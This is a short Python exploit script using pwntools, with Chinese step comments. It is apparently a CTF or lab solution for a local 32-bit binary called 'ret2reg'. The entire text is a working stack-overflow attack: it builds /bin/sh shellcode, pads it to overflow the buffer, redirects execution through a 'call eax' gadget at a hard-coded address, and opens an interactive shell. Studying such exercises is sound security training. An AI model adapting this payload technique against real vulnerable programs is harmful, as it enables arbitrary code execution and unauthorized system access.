from pwn import *

# 1.使用pwntools自带的功能生成shellcode
shellcode = asm(shellcraft.sh())

# 2.call eax的地址
call_eax = p32(0x080490d0)

# 3.构造payload
payload = flat([shellcode , b'a'* (0x20c - len(shellcode) ),call_eax])

# 4.启动进程传递参数
io = process(argv=[ "./ret2reg",payload])

# 5.获得交互式shell
io.interactive()
